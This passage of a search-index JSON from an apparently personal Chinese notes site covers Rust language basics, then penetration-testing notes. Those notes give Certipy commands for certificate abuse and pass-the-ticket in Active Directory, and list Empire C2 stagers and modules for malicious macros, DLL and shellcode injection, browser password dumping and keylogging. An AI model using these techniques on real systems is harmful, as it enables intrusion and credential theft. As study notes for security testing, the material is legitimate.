\u4e0d\u53ef\u53d8\u53d8\u91cf\u4e0d\u80fd\u591f\u4e8c\u6b21\u8d4b\u503c\uff0c\u4e0d\u80fd\u4fee\u6539\uff0c\u4f46\u591a\u6b21let\u53ef\u4ee5\u4fee\u6539","title":"\u53ef\u53d8\u6027"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_6","text":"\u5e38\u91cf\u603b\u662f\u4e0d\u53ef\u53d8 \u4f7f\u7528const\u6765\u7533\u660e\u5e38\u91cf \u5e38\u91cf\u540d\u79f0\u547d\u540d\u7ea6\u5b9a\u662f\u5168\u5927\u5199\uff0c\u5355\u8bcd\u95f4\u4e0b\u5212\u7ebf const A_B: u32 = 111 ;","title":"\u5e38\u91cf"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_7","text":"let\u8d4b\u503c\u7684\u53d8\u91cf\u53ea\u5728\u5f53\u524d\u4f5c\u7528\u57df\u751f\u6548\uff0c\u6bd4\u5982\u82b1\u62ec\u53f7\u4e2d\u867d\u7136x\u91cd\u65b0\u88ab\u8ba1\u7b97\uff0c\u4f46\u5728\u82b1\u62ec\u53f7\u4e4b\u5916\uff0cx\u4f9d\u65e7\u662f6 fn main() { let x = 5; let x = x + 1; { let x = x * 2; println!(\"The value of x in the inner scope is: {x}\"); } println!(\"The value of x is: {x}\"); } \u53d8\u91cf\u4f1a\u5728\u4ee5\u4e0b\u60c5\u51b5\u79bb\u5f00\u4f5c\u7528\u57df\uff0c\u79bb\u5f00\u4e86\u4f5c\u7528\u57df\uff0c\u76f8\u5f53\u4e8e\u88ab\u4e22\u5f03 \u51fd\u6570\u7ed3\u675f\u3002 \u4ee3\u7801\u5757\u7ed3\u675f\u3002 \u53d8\u91cf\u88ab\u8d4b\u503c\u7ed9\u53e6\u4e00\u4e2a\u53d8\u91cf\u3002 \u53d8\u91cf\u88ab\u9690\u5f0f\u79fb\u52a8\u5230\u53e6\u4e00\u4e2a\u4f5c\u7528\u57df\u3002","title":"\u53d8\u91cf\u7684\u4f5c\u7528\u57df"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_8","text":"rust\u4e0ec\u3001c++\u4e00\u6837\u662f\u9759\u6001\u7c7b\u578b\u8bed\u8a00\uff0c\u5728\u7f16\u8bd1\u65f6\u5c31\u5fc5\u987b\u77e5\u9053\u6240\u6709\u53d8\u91cf\u7684\u7c7b\u578b\u3002 \u9700\u8981\u660e\u786e\u5730\u4e3a\u53d8\u91cf\u6307\u51fa\u53d8\u91cf\u7c7b\u578b\u65f6\u4f7f\u7528 \u53d8\u91cf : \u7c7b\u578b \u6765\u6307\u5b9a let x:u64 = 5; i32 32\u4f4d\u6570\u5b57 u32 32\u4f4d\u65e0\u7b26\u53f7\u6570\u5b57 let mut guess = String::new(); //\u521b\u5efa\u4e00\u4e2a\u5b57\u7b26\u7c7b\u578b\u53ef\u53d8\u53d8\u91cf let guess: u32 = xx ; //\u518d\u6b21let","title":"\u6570\u636e\u7c7b\u578b"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_9","text":"\u6709\u7b26\u53f7 \u548c \u65e0\u7b26\u53f7 \u4ee3\u8868\u6570\u5b57\u80fd\u5426\u4e3a\u8d1f\u503c\u3002 \u7531\u4e8e\u4f7f\u7528\u8d1f\u6570\u9700\u8981\u727a\u7272\u4e00\u4f4d\u6570\u4f5c\u4e3a\u8865\u7801\u8868\u793a\u662f\u6b63\u6570\u8fd8\u662f\u8d1f\u6570\uff0c\u6240\u4ee5\u65e0\u7b26\u53f7\u7684\u6b63\u6570\u66f4\u5927\uff0c\u800c\u6709\u7b26\u53f7\u7684\u6574\u6570\u5219\u80fd\u8868\u793a\u8d1f\u6570\u3002 \u957f\u5ea6 \u6709\u7b26\u53f7 \u65e0\u7b26\u53f7 8-bit i8 u8 16-bit i16 u16 32-bit i32 u32 64-bit i64 u64 128-bit i128 u128 arch isize usize \u53ef\u4ee5\u4f7f\u7528 _ \u8fde\u63a5\u6570\u5b57 let x:isize = 98_222; \u53ef\u4ee5\u4f7f\u7528\u540e\u7f00\u8868\u793a\u7c7b\u578b let y = 123u8;","title":"\u6574\u5f62"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_10","text":"\u7c7b\u578b f32 \u548c f64","title":"\u6d6e\u70b9\u578b"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#bool","text":"true \u548c false","title":"Bool\u578b"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_11","text":"char","title":"\u5b57\u7b26\u578b"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_12","text":"let z: String = String::from(\"Hello, World!\");","title":"\u5b57\u7b26\u4e32"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_13","text":"\u5143\u7ec4\u7684\u6210\u5458\u7c7b\u578b\u53ef\u4ee5\u4e0d\u540c let tup: (i32, f64, u8) = (500, 6.4, 1); \u8bbf\u95ee\u5143\u7ec4\u7684\u4e24\u79cd\u65b9\u5f0f \u89e3\u6784 let tup = (500, 6.4, 1); let (x, y, z) = tup; println!(\"The value of y is: {y}\"); \u5f15\u7528 let x: (i32, f64, u8) = (500, 6.4, 1); let five_hundred = x.0; let six_point_four = x.1; let one = x.2;","title":"\u5143\u7ec4"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_14","text":"\u6570\u7ec4\u7684\u5143\u7d20\u7c7b\u578b\u5fc5\u987b\u76f8\u540c\uff0c\u4e14\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\uff0c\u5206\u914d\u65f6\u65e2\u4e0d\u80fd\u591a\u4e5f\u4e0d\u80fd\u5c11\u3002 \u6570\u7ec4\u5728\u6808\u4e0a\u5206\u914d\u7a7a\u95f4\u3002 let a: [i32; 5] = [1, 2, 3, 4, 5]; let a = [1, 2, 3, 4, 5]; \u8bbf\u95ee\u6570\u7ec4 let a = [1, 2, 3, 4, 5]; let first = a[0]; let second = a[1];","title":"\u6570\u7ec4"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_15","text":"fn \u58f0\u660e\u65b0\u51fd\u6570","title":"\u51fd\u6570"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_16","text":"\u8bed\u53e5\u6ca1\u6709\u8fd4\u56de\u503c \u8868\u8fbe\u5f0f\u53ef\u4ee5\u8fd4\u56de\u503c,\u8868\u8fbe\u5f0f\u6700\u540e\u4e00\u53e5\u6ca1\u6709\u5206\u53f7 ; fn main() { let y = { let x = 3; x + 1 }; println!(\"The value of y is: {y}\"); }","title":"\u8bed\u53e5\u548c\u8868\u8fbe\u5f0f"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_17","text":"\u51fd\u6570\u4f53\u6700\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u5c31\u662f\u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u4f7f\u7528 -> \u6765\u6307\u5b9a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u7c7b\u578b fn five() -> i32 { 5 } fn main() { let x = five(); println!(\"The value of x is: {x}\"); } String::new(); ::\u610f\u5473\u5173\u8054\u51fd\u6570","title":"\u51fd\u6570\u7684\u8fd4\u56de\u503c"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_18","text":"","title":"\u6d41\u7a0b\u63a7\u5236"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_19","text":"if - \u6ca1\u6709\u591a\u5927\u533a\u522b","title":"\u6761\u4ef6\u5206\u652f"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_20","text":"loop while","title":"\u5faa\u73af"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#match","text":"match\u8bed\u53e5\u662f\u4e00\u79cd\u63a7\u5236\u6d41\u7ed3\u6784\uff0c\u7528\u4e8e\u6839\u636e\u503c\u7684\u7c7b\u578b\u6216\u503c\u7684\u503c\u6765\u6267\u884c\u4e0d\u540c\u7684\u4ee3\u7801\u3002 match\u53ef\u4ee5\u5339\u914d\u53d8\u91cf\u3001\u8bed\u53e5\u3001\u8868\u8fbe\u5f0f\u3001\u51fd\u6570\u3002\u7136\u540e\u6839\u636e\u5339\u914d\u7684\u8868\u8fbe\u5f0f\u7684pattern\u503c\u6765\u6267\u884c\u76f8\u5e94\u7684\u4ee3\u7801\u3002 match\u51fd\u6570\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528&\u6765\u5f15\u7528\u51fd\u6570\uff0c\u51cf\u5c11\u51fd\u6570\u7684\u8fd0\u884c\u6b21\u6570\u3002 match expression { pattern => code, _ => code, }","title":"match"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_21","text":"\u4e00\u79cd\u5185\u5b58\u7ba1\u7406\u65b9\u5f0f\u3002 \u901a\u8fc7\u6240\u6709\u6743\u7cfb\u7edf\u7ba1\u7406\u5185\u5b58\uff0c\u7f16\u8bd1\u5668\u5728\u7f16\u8bd1\u65f6\u4f1a\u6839\u636e\u4e00\u7cfb\u5217\u7684\u89c4\u5219\u8fdb\u884c\u68c0\u67e5\u3002\u5982\u679c\u8fdd\u53cd\u4e86\u4efb\u4f55\u8fd9\u4e9b\u89c4\u5219\uff0c\u7a0b\u5e8f\u90fd\u4e0d\u80fd\u7f16\u8bd1\u3002\u5728\u8fd0\u884c\u65f6\uff0c\u6240\u6709\u6743\u7cfb\u7edf\u7684\u4efb\u4f55\u529f\u80fd\u90fd\u4e0d\u4f1a\u51cf\u6162\u7a0b\u5e8f\u3002 > 1. Rust \u4e2d\u7684\u6bcf\u4e00\u4e2a\u503c\u90fd\u6709\u4e00\u4e2a \u6240\u6709\u8005\uff08_owner_\uff09\u3002 > 2. \u503c\u5728\u4efb\u4e00\u65f6\u523b\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u6240\u6709\u8005\u3002 > 3. \u5f53\u6240\u6709\u8005\uff08\u53d8\u91cf\uff09\u79bb\u5f00\u4f5c\u7528\u57df\uff0c\u8fd9\u4e2a\u503c\u5c06\u88ab\u4e22\u5f03\u3002 \u53ef\u53d8\u5185\u5b58\u6709\u5173\u7684\u6570\u636e\u5206\u914d\uff0c\u53d8\u91cf\u53ea\u5728\u5f53\u524d\u4f5c\u7528\u57df\u751f\u6548\u3002 \u8fd9\u6837\u505a\u662f\u56e0\u4e3arust\u5c3d\u53ef\u80fd\u63d0\u9ad8\u7a0b\u5e8f\u8fd0\u884c\u6548\u7387 fn main() { let a = 1; //\u5b58\u50a8\u5728\u6808\u4e0a let b = a; let s1 = String::from(\"hello\"); //\u7ed9\u4e86S1 let s2 = s1; //S1\u88ab\u8d4b\u503c\u7ed9S2\uff0cS1\u79bb\u5f00\u4e86\u4f5c\u7528\u57df\uff0cS1\u88ab\u4e22\u5f03 println!(\"A:{}\\nB:{}\\nS2:{}\\nworld!\", a,b,s2); }","title":"\u6240\u6709\u6743"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_22","text":"\u5176\u5b9e\u53ef\u4ee5\u5c1d\u8bd5\u7406\u89e3\u4e3a\u6307\u9488 \u4f7f\u7528 & \u6765\u5728\u4e0d\u83b7\u53d6\u5bf9\u8c61\u7684\u6240\u6709\u6743\u7684\u60c5\u51b5\u4e0b\u83b7\u53d6\u503c\u3002 fn main() { let s1 = String::from(\"hello\"); let len = calculate_length(&s1); //\u4f7f\u7528&s1\u5f15\u7528s1\u7684\u503c\uff0c\u4e0d\u8f6c\u79fb\u6240\u6709\u6743 println!(\"The length of '{}' is {}.\", s1, len); //\u7531\u4e8es1\u6240\u6709\u6743\u6ca1\u6709\u8f6c\u79fb\uff0c\u6240\u4ee5s1\u5230\u8fd9\u91cc\u4f9d\u65e7\u53ef\u7528 } fn calculate_length(s: &String) -> usize { //\u51fd\u6570\u7c7b\u578b\u4e5f\u8981\u5bf9\u5e94& s.len() } \u4e00\u822c\u7684\u5f15\u7528\u65e0\u6cd5\u5bf9\u5f15\u7528\u5bf9\u8c61\u8fdb\u884c\u4fee\u6539\uff0c\u56e0\u4e3a\u6ca1\u6709\u6240\u6709\u6743 fn main() { let s = String::from(\"hello\"); change(&s); } fn change(some_string: &String) { some_string.push_str(\", world\"); //\u8fd9\u91cc\u5c1d\u8bd5\u4fee\u6539some_string\uff0c\u4f1a\u62a5\u9519 } \u53ef\u53d8\u5f15\u7528 \u53ef\u53d8\u5f15\u7528\u9700\u8981\u53ef\u53d8\u53d8\u91cf\uff0c\u7136\u540e\u4f7f\u7528 &mut \u5f15\u7528 fn main() { let mut s = String::from(\"hello\"); change(&mut s); } fn change(some_string: &mut String) { some_string.push_str(\", world\"); } \u60ac\u6302\u5f15\u7528 \u540c\u60ac\u6302\u6307\u9488\uff0c\u5185\u5b58\u88ab\u91ca\u653e\u4e86\u800c\u6307\u9488\u8fd8\u5728\u3002\u8fd9\u91cc\u7684\u662f\u5185\u5b58\u88ab\u91ca\u653e\u4e86\uff0c\u800c\u5f15\u7528\u8fd8\u5728\u3002 \u8fd9\u662f\u4e00\u4e2a\u9519\u8bef\u4f8b\u5b50\uff0c\u7531\u4e8edangle\u51fd\u6570\u8fd4\u56de\u7684\u662fs\u7684\u5f15\u7528\uff0cdangle\u6267\u884c\u5b8c\u540es\u7684\u6240\u6709\u6743\u6ca1\u6709\u88ab\u79fb\u4ea4\u5bfc\u81f4\u88ab\u91ca\u653e\u3002main\u51fd\u6570\u4e2ddangle\u662f\u65e0\u6cd5\u8fd4\u56des\u7684 fn main() { let reference_to_nothing = dangle(); } fn dangle() -> &String { // dangle \u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u5f15\u7528 let s = String::from(\"hello\"); // s \u662f\u4e00\u4e2a\u65b0\u5b57\u7b26\u4e32 &s // \u8fd4\u56de\u5b57\u7b26\u4e32 s \u7684\u5f15\u7528 } // \u8fd9\u91cc s \u79bb\u5f00\u4f5c\u7528\u57df\u5e76\u88ab\u4e22\u5f03\u3002\u5176\u5185\u5b58\u88ab\u91ca\u653e\u3002","title":"\u5f15\u7528\u4e0e\u501f\u7528"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_23","text":"Rust\u4e2d\u7684\u5207\u7247\uff08slice\uff09\u662f\u6307\u5bf9\u6570\u636e\u503c\u7684\u90e8\u5206\u5f15\u7528\uff0c\u5728\u4e0d\u8f6c\u79fb\u5bf9\u8c61\u6240\u6709\u6743\u7684\u60c5\u51b5\u4e0b\u5bf9\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\u3002 \u904d\u5386\u5207\u7247 let slice = &[1, 2, 3, 4, 5]; for x in slice { println!(\"{}\", x); } \u4fee\u6539\u5207\u7247 let mut slice = &mut [1, 2, 3, 4, 5]; slice[0] = 10; println!(\"{:?}\", slice);","title":"\u5207\u7247"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_24","text":"struct User { //\u7ed3\u6784\u4f53\u5b9a\u4e49 active: bool, username: String, email: String, sign_in_count: u64, } fn main() { let user1 = User { //\u521b\u5efa\u7ed3\u6784\u4f53\u5b9e\u4f8b active: true, username: String::from(\"someusername123\"), email: String::from(\"someone@example.com\"), sign_in_count: 1, }; user1.email = String::from(\"anotheremail@example.com\"); //\u5355\u4e2a\u503c\u64cd\u4f5c }","title":"\u7ed3\u6784\u4f53"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_25","text":"","title":"\u5e38\u89c1\u96c6\u5408\u7c7b\u578b"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#vector","text":"fn main() { let v: Vec<i32> = Vec::new(); }","title":"Vector"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#string","text":"new\u65b0\u5efa let mut s = String::new(); let data = \"initial contents\"; let s = data.to_string(); from\u65b0\u5efa let s = String::from(\"initial contents\"); \u4f7f\u7528 push_str \u7b26\u52a0\u5b57\u7b26\u4e32 let mut s = String::from(\"foo\"); s.push_str(\"bar\");","title":"String"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#hash-map","text":"hash map\u662f\u4e00\u4e2a\u952e\u503c\u5bf9","title":"Hash Map"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_26","text":"rust\u5c06\u9519\u8bef\u5206\u4e3a\u53ef\u6062\u590d\u7684\u548c\u4e0d\u53ef\u6062\u590d\u7684\uff0c\u5e76\u4f7f\u7528\u5b8f\u6765\u5904\u7406\u4ed6\u4eec \u4f7f\u7528 panic! \u5904\u7406\u4e0d\u53ef\u6062\u590d\u7684\u9519\u8bef\u3002 \u4f7f\u7528 Result \u5904\u7406\u53ef\u6062\u590d\u7684\u9519\u8bef\u3002","title":"\u9519\u8bef"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E6%94%BB%E5%87%BB%E9%9D%A2%E6%B5%81%E7%A8%8B%E5%9B%BE/","text":"","title":"AD\u653b\u51fb\u9762\u6d41\u7a0b\u56fe"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Certipy%E8%AF%B4%E6%98%8E/","text":"4.0\u8bf4\u660e\u6587\u7ae0 https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7 \u6253\u5f00ldapshell \u914d\u7f6e\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\u3001\u5c06\u7528\u6237\u6dfb\u52a0\u5230\u7ec4\u3001\u8bfb\u53d6 LAPS\u3001 \u7b49\u7b49 certipy auth -pfx xxx.pfx -ldap-shell \u96c6\u6210\u8eab\u4efd\u8ba4\u8bc1 \u5728\u4e0d\u77e5\u9053\u51ed\u636e\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5728\u672c\u5730\u8ba1\u7b97\u673a\u8fd0\u884ccertipy \u5c06PFX\u8bc1\u4e66\u6ce8\u5165\u7968\u636e certipy auth -pfx xxx.pfx -ptt -no-save -no-hash \u8fd8\u53ef\u4ee5\u6ce8\u5165base64\u7684\u7968\u636e\uff0c\u4f8b\u5982Rubeus\u7684\u7968\u636e certipy auth -pfx xxx.pfx -print -no-save -no-hash certipy ptt -ticket xxxxxxx \u901a\u8fc7web\u4f7f\u7528\u547d\u4ee4\u8bf7\u6c42\u8bc1\u4e66 certipy req -ca 'DC-CA' -username xxxx@xx.xx -password xxxx -web -debug","title":"Certipy\u8bf4\u660e"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Certipy%E8%AF%B4%E6%98%8E/#40","text":"https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7","title":"4.0\u8bf4\u660e\u6587\u7ae0"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Certipy%E8%AF%B4%E6%98%8E/#ldapshell","text":"\u914d\u7f6e\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\u3001\u5c06\u7528\u6237\u6dfb\u52a0\u5230\u7ec4\u3001\u8bfb\u53d6 LAPS\u3001 \u7b49\u7b49 certipy auth -pfx xxx.pfx -ldap-shell","title":"\u6253\u5f00ldapshell"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Certipy%E8%AF%B4%E6%98%8E/#_1","text":"\u5728\u4e0d\u77e5\u9053\u51ed\u636e\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5728\u672c\u5730\u8ba1\u7b97\u673a\u8fd0\u884ccertipy","title":"\u96c6\u6210\u8eab\u4efd\u8ba4\u8bc1"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Certipy%E8%AF%B4%E6%98%8E/#pfx","text":"certipy auth -pfx xxx.pfx -ptt -no-save -no-hash \u8fd8\u53ef\u4ee5\u6ce8\u5165base64\u7684\u7968\u636e\uff0c\u4f8b\u5982Rubeus\u7684\u7968\u636e certipy auth -pfx xxx.pfx -print -no-save -no-hash certipy ptt -ticket xxxxxxx","title":"\u5c06PFX\u8bc1\u4e66\u6ce8\u5165\u7968\u636e"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Certipy%E8%AF%B4%E6%98%8E/#web","text":"certipy req -ca 'DC-CA' -username xxxx@xx.xx -password xxxx -web -debug","title":"\u901a\u8fc7web\u4f7f\u7528\u547d\u4ee4\u8bf7\u6c42\u8bc1\u4e66"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/DACL%20%E6%94%BB%E5%87%BB%E9%9D%A2/","text":"","title":"DACL \u653b\u51fb\u9762"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/","text":"title: Empire\u7b14\u8bb0 date: 2021-1-15 10:13:20 \u5f00\u542f\u76d1\u542c (Empire) > listeners (Empire: listeners) > uselistener dbx Dropbox\u7684\u76d1\u542c http http\u76d1\u542c\u3010\u5e38\u7528\u3011 http_com https\u76d1\u542c\uff0c\u9700\u8981\u6307\u5b9a\u8bc1\u4e66 http_foreign \u6d3e\u751f\u7c7b\u76d1\u542c\uff0c\u7528\u4e8e\u63a5\u6536\u7ed9\u522b\u7684\u6d3e\u751f\u3010\u8ddfcs\u7684\u517c\u5bb9\u6027\u4e0d\u592a\u597d\u3011 http_hop \u7528\u4e8e\u76d1\u542c\u5668\u7684\u8df3\u8f6c http_malleable \u81ea\u5b9a\u4e49C2 http_mapi \u6682\u672a\u7814\u7a76 meterpreter \u7528\u4e8e\u6d3e\u751f\u7ed9msf\uff1f onedrive onedrive\u76d1\u542c\u5668 redirector \u91cd\u5b9a\u5411\uff1f \u670910\u79cd\u53ef\u9009\uff0c\u5e38\u7528\u7684\u57fa\u672c\u5c31\u662fhttp \u9009\u62e9\u8f7d\u8377 multi/bash \u751f\u6210python\u7684\u6267\u884c\u9a6c\uff0c\u53ef\u9009powershell\u548cpython multi/launcher \u751f\u6210\u4e00\u53e5\u8bdd\uff0c\u53ef\u9009powershell\u548cpython multi/macro \u751f\u6210\u6076\u610f\u5b8f\u4ee3\u7801 multi/pyinstaller \u7528pyinstaller\u6253\u5305\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u7531\u4e8eempire\u662f\u5728Linux\u4e0b\u8fd0\u884c\u7684\uff0c\u6240\u4ee5\u6253\u5305\u7684\u662fLinux\u7684\u53ef\u6267\u884c\u6587\u4ef6 multi/war \u751f\u6210\u53ef\u53d1\u5e03\u7684war\u5305\uff0c\u6267\u884c\u540ejava\u8c03\u7528powershell\u6216python\u4e0a\u7ebf windows/bunny bunny\u6267\u884c\u6587\u4ef6 windows/ducky ducky\u6267\u884c\u6587\u4ef6 windows/csharp_exe \u751f\u6210C#\u6e90\u7801 windows/launcher_lnk \u4e3a\u6307\u5b9a\u7684\u5e94\u7528\u7a0b\u5e8f\u751f\u6210\u4e00\u4e2a\u6076\u610flnk windows/teensy teensy\u6267\u884c\u6587\u4ef6 windows/wmic \u751f\u6210xsl \u5176\u5b9e\u8fd9\u91cc\u7684\u8f7d\u8377\u539f\u7406\u5927\u540c\u5c0f\u5f02\uff0c\u6838\u5fc3\u4ee3\u7801\u90fd\u662fmulti/launcher\u91cc\u7684\uff0c\u53ef\u4ee5\u9488\u5bf9\u6027\u505a\u514d\u6740 agent\u64cd\u4f5c interact\u8fdb\u5165agent \u57fa\u672c\u547d\u4ee4shell\u3001upload\u3001list\u3001info\u3002 \u5728interact\u79cd\uff0c\u6838\u5fc3\u662f\u6a21\u5757 code_execution \u5b57\u9762\u610f\u601d\uff0c\u4ee3\u7801\u6267\u884c\u3002 Assembly\u6307\u5b9a\u7a0b\u5e8f code_execution/invoke_assembly \u4ece\u5185\u5b58\u6267\u884cdonet\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u4e00\u4e9b\u9632\u62a4 code_execution/invoke_dllinjection dll\u6ce8\u5165\uff0c\u4f7f\u7528\u7684PowerSploit\u91cc\u7684\u3002 ProcessID\u6307\u5b9a\u8981\u6ce8\u5165\u7684ID DLL\u6307\u5b9a\u8981\u6ce8\u5165\u7684dll code_execution/invoke_metasploitpayload \u4f7f\u7528msf\u7684web_delivery\u6a21\u5757\u6ce8\u5165 URL\u6307\u5b9aweb_delivery\u7684URL code_execution/invoke_ntsd \u4f7f\u7528NTSD\u6d3e\u751f\u4e00\u4e2aagent code_execution/invoke_reflectivepeinjection PowerSploit\u91cc\u7684\u53cd\u5c04\u578b\u6ce8\u5165\uff0c\u4f60\u95ee\u8fd9\u4e2a\u6ce8\u5165\u6709\u4ec0\u4e48\u4e0d\u4e00\u6837\u7684\u5730\u65b9\uff0c\u6211\u4e5f\u4e0d\u77e5\u9053\u3002 code_execution/invoke_shellcode \u8fd8\u662fPowerSploit\u91cc\u7684\u6a21\u5757\uff0c\u6267\u884cshellcode\u3002\u8981c#\u7684 Shellcode\u6307\u5b9ashellcode code_execution/invoke_shellcodemsil \u5728powershell\u79cd\u4e0d\u8c03\u7528win32 API\u6765\u6267\u884cshellcode\u7684\u65b9\u5f0f\uff0c\u5bf9shellcode\u8981\u6c42\u4e25\u683c \u8fd8\u662f\u522b\u7528\u8fd9\u4e2a\u4e86 collection \u5b57\u9762\u610f\u601d\uff0c\u4fe1\u606f\u641c\u96c6 collection/ChromeDump \u5c1d\u8bd5\u83b7\u53d6Chrome\u5bc6\u7801 collection/FoxDump collection/SharpChromium collection/USBKeylogger \u770bUK\u7684\u65e5\u5fd7 collection/WebcamRecorder \u6444\u50cf\u5934 collection/browser_data \u6d4f\u89c8\u5668\u6570\u636e collection/clipboard_monitor \u7c98\u8d34\u677f\u76d1\u63a7 collection/file_finder \u67e5\u627eIPC\u5171\u4eab\u6587\u4ef6 find_interesting_file \u4e00\u6837 collection/get-winupdates \u83b7\u53d6\u66f4\u65b0\u5386\u53f2 collection/get_indexed_item collection/get_sql_column_sample_data collection/get_sql_query \u540e\u9762\u4e0d\u5199\u4e86\u90fd\u662f\u83b7\u53d6\u5404\u79cd\u4fe1\u606f\u7684\u4e1c\u897f credentials \u83b7\u53d6\u51ed\u8bc1\u548ctoken\u7684 exfiltration \u626b\u7aef\u53e3 lateral_movement \u6a2a\u5411 management persistence \u6743\u9650\u7ef4\u6301\u7684 privesc \u63d0\u6743 recon situational_awareness trollsploit","title":"Empire\u7b14\u8bb0"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#title-empire-date-2021-1-15-101320","text":"","title":"title: Empire\u7b14\u8bb0 date: 2021-1-15 10:13:20"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#_1","text":"(Empire) > listeners (Empire: listeners) > uselistener dbx Dropbox\u7684\u76d1\u542c http http\u76d1\u542c\u3010\u5e38\u7528\u3011 http_com https\u76d1\u542c\uff0c\u9700\u8981\u6307\u5b9a\u8bc1\u4e66 http_foreign \u6d3e\u751f\u7c7b\u76d1\u542c\uff0c\u7528\u4e8e\u63a5\u6536\u7ed9\u522b\u7684\u6d3e\u751f\u3010\u8ddfcs\u7684\u517c\u5bb9\u6027\u4e0d\u592a\u597d\u3011 http_hop \u7528\u4e8e\u76d1\u542c\u5668\u7684\u8df3\u8f6c http_malleable \u81ea\u5b9a\u4e49C2 http_mapi \u6682\u672a\u7814\u7a76 meterpreter \u7528\u4e8e\u6d3e\u751f\u7ed9msf\uff1f onedrive onedrive\u76d1\u542c\u5668 redirector \u91cd\u5b9a\u5411\uff1f \u670910\u79cd\u53ef\u9009\uff0c\u5e38\u7528\u7684\u57fa\u672c\u5c31\u662fhttp","title":"\u5f00\u542f\u76d1\u542c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#_2","text":"multi/bash \u751f\u6210python\u7684\u6267\u884c\u9a6c\uff0c\u53ef\u9009powershell\u548cpython multi/launcher \u751f\u6210\u4e00\u53e5\u8bdd\uff0c\u53ef\u9009powershell\u548cpython multi/macro \u751f\u6210\u6076\u610f\u5b8f\u4ee3\u7801 multi/pyinstaller \u7528pyinstaller\u6253\u5305\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u7531\u4e8eempire\u662f\u5728Linux\u4e0b\u8fd0\u884c\u7684\uff0c\u6240\u4ee5\u6253\u5305\u7684\u662fLinux\u7684\u53ef\u6267\u884c\u6587\u4ef6 multi/war \u751f\u6210\u53ef\u53d1\u5e03\u7684war\u5305\uff0c\u6267\u884c\u540ejava\u8c03\u7528powershell\u6216python\u4e0a\u7ebf windows/bunny bunny\u6267\u884c\u6587\u4ef6 windows/ducky ducky\u6267\u884c\u6587\u4ef6 windows/csharp_exe \u751f\u6210C#\u6e90\u7801 windows/launcher_lnk \u4e3a\u6307\u5b9a\u7684\u5e94\u7528\u7a0b\u5e8f\u751f\u6210\u4e00\u4e2a\u6076\u610flnk 